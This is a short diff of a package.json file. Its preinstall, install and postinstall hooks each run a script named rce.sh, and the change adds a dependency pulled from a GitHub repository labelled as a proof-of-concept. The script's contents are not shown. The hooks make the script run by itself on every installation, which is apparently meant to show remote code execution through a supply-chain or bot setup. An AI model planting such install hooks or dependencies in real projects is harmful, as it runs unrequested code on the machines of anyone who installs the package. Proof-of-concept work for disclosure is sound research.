@@ -6,5 +6,8 @@
     "preinstall": "sh ./rce.sh",
     "install": "sh ./rce.sh",
     "postinstall": "sh ./rce.sh"
+  },
+  "dependencies": {
+    "poc-dep-artifact": "github:PDFtoMark/gab-poc-lintbot-dep"
   }
 }
